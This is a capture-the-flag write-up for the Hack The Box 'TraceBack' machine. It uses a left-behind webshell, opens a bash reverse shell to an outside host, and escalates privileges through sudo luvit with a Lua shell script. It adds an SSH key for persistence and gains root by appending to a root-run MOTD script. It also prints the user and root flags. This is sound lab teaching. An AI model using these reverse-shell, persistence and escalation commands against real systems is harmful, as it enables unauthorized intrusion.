# TraceBack
> Write-up author: jon-brandy


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a5389983-7994-42b7-87d6-c39c262b8597)


## Lessons Learned:
1. Enumeration.
2. Utilizing dropped backdoor.
3. Writing Lua.
4. Generating ssh-key to get more stable shell.
5. Manipulating SSH Motd.

## STEPS:
> PORT SCANNING

```
┌──(brandy㉿bread-yolk)-[~]
└─$ nmap -p- -sV -sC traceback.htb --min-rate 1000 -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-25 19:53 PDT
Nmap scan report for traceback.htb (10.10.10.181)
Host is up (0.017s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9625518e6c830748ce114b1fe56d8a28 (RSA)
|   256 54bd467114bdb242a1b6b02d94143b0d (ECDSA)
|_  256 4dc3f852b885ec9c3e4d572c4a82fd86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Help us
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.67 seconds
```

1. Based from the nmap results above, seems the machine runs web application at port 80 and opens ssh login at port 22.

> WEB APP

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0ed872db-def1-40fd-b05b-f01b2f8d6548)


2. Seems the webapp is already compromised and the attacker left a backdoor which is accessible he said.
3. Hence let's execute directory listing using **dirsearch**.
4. However, dirsearch resulting to none. It means the webshell filename is not common.
5. Reviewing the message shown, resulting to no clue other than searching the `Xh4H` name online.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f7d67e1f-c1d5-4919-b0f7-3617db19484b)



6. Traversing on the internet resulting to this:

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f5d980a2-9a97-4b54-a70e-a82e3600451a)


7. Adding **webshell** to our search query, resulting to this:

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/75d799d5-5024-41b6-bf40-3d71becb4ddc)


8. The first result, should be our interest.

> GITHUB

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1384da27-8377-4203-b854-bb513772c9e8)

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/e6c49331-c7e6-4672-9fe2-3b2ca7ab052a)


9. Enumerating each webshell file, the backdoor dropped is --> `smevk.php`.

> Enter creds --> `admin:admin` (shown at the source code).

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/363c04a5-96e9-4972-b799-ee967df3f46e)


10. Indeed it seems the best backdoor 🤲🏻.
11. Long story short, after traversing to `/home/webadmin`, found a note from sysadmin team.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/051e6bac-d543-485c-8429-a6da4faa6d3b)

12. Reviewing the bash history file, found that a binary named **luvit** seems inside the sudo permission.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/fd1ac823-a2ee-4330-ad17-afd3a7a4c729)


13. This could be used for our lateral movement later.
14. Great! Anyway let's get more comfy enumeration by getting a reverse shell.
15. I used simple bash reverse shell:

```txt
bash -c 'bash -i >& /dev/tcp/10.10.14.4/1337 0>&1'
```

16. Set up a listener at port **1337** than enter it on the **execute** box.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ef6adcff-da39-4c24-bc8b-1fe47e9bbeea)


> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/2a27e9b7-5e5d-4ad5-9b8c-70f7baa8668c)


17. Remembering the **luvit** binary is inside the **sysadmin** home directory, we need to traverse there, but currently we are denied.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c7ab4b96-ae8f-45df-8825-c177f4ff3123)


18. BUT thing to note, upon checking the sudo permission seems **luvit** is executable by any user.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/30fcc402-ea95-46e5-83d8-9b12e350fb76)


19. Remembering we can specify a username, hence we could gain access to sysadmin's home directory.
20. Let's use the **luvit** binary.

===

### USING LUVIT

- Sending shell spawn LOCs to lua.

```
echo "require('os');" > sysad.lua
echo "os.execute('/bin/bash');" > sysad.lua
```

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b472f3aa-ca88-4f55-93a5-b44f419c6402)


> GETTING USER FLAG

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/54a0f835-d4c9-4fda-a9d1-840b85d5aa60)



## USER FLAG

```
4835038ff249e1ae23de765fc1110e3d
```

21. Great! Now let's change our shell mode to interactive by executing `bash -i`, then add our ssh-key to sysadmin's authorized_keys.
22. With this, we can have access directly without dropping reverse shell.

```console
Generate ssh key at our local machine.

┌──(brandy㉿bread-yolk)-[~/.ssh]
└─$ ssh-keygen
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/brandy/.ssh/id_ed25519): sysadmin
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in sysadmin
Your public key has been saved in sysadmin.pub
The key fingerprint is:
SHA256:ExUTsfRZaVupYJr+VAwDiB+QPtNOGz92d+chutc2U5A brandy@bread-yolk
The key's randomart image is:
+--[ED25519 256]--+
|     .+ ..O+  ...|
|     o o o O oo..|
|    . o o = B..+ |
|     + = +   +E  |
|      = S   .  . |
|       o * o o oo|
|        . = o +.+|
|           o . =.|
|           .o . o|
+----[SHA256]-----+
                                                                                                                                                                                             
┌──(brandy㉿bread-yolk)-[~/.ssh]
└─$ cat sysadmin.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGlvFYfrNpHf4A8gXc+IB+B8xYMYE3ajJkruV47FkzhJ brandy@bread-yolk
```

23. Then, add it to sysadmin's authorized_keys file.

```
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGlvFYfrNpHf4A8gXc+IB+B8xYMYE3ajJkruV47FkzhJ brandy@bread-yolk" >> authorized_keys
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6869268c-1acf-457a-96ca-95ca24c535b4)


#### NOTES:

```
Remember to execute the ssh inside .ssh directory and don't forget to execute chmod 400 to id_rsa file.
```


24. Awesome, to gain root, I used **linpeas** to identify misconfigurations or vulns reside in this machine which might help us to gain root.
25. Also I used **pspy64** to identify cron job processes run without the need for root.
26. Long story short, after reviewing the **pspy64** result, found a process which executed as root user right after I change the shell mode to interactive.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/59361f7d-5dbc-4dcd-a84e-13df3b93bae2)


27. Reviewing the next activity, turns out the process is executed at every 30 seconds.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8838b0eb-aef1-4842-8156-1b7723aa81e3)



28. Seems `/etc/update-motd.d/` should be our target by now.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/553d4ec0-0072-44f8-ad3c-09fe1d2bc35a)


29. Noticed that sysadmin is group owner of all the files inside it and each files is executed as **root**.
30. Amazing! We can gained root easily by manipulating the one of the files inside it, then ssh again later on to trigger the cronjob. 

#### NOTES:

```
So what is MOTD?
- Basicly Message of The Day or MOTD is a message prompted at the beginning of the shell login.

EX:

┌──(brandy㉿bread-yolk)-[~/.ssh]
└─$ ssh -i sysadmin sysadmin@traceback.htb
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land 



Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Wed Jun 26 01:16:00 2024 from 10.10.14.4
$ bash -i
sysadmin@traceback:~$
```

31. Reviewing the **00-header** we can see clearly the prompted message.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b7c29344-3a56-4b0e-8290-36805582f0c8)


32. Okay so there are actually several methods can be done to obtain the root flag. Either you want to PWN the root user by uploading a reverse shell payload, upload your root ssh keys OR even by simply cat the flag at the MOTD.
33. I am using the simplest method.
34. Simply run `echo "cat /root/root.txt" >> 00-header`.
35. Then quickly re-log to sysadmin.

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/9e7f41ae-afdb-4804-a7ac-4d688e0641ea)


## ROOT FLAG

```
92145f05dcaf9ce7817625dcd1e34d73
```

36. We've pwned it! Well not fullpwn, but still doable if you want.


## IMPORTANT LINKS

```
https://man7.org/linux/man-pages/man5/motd.5.html
```
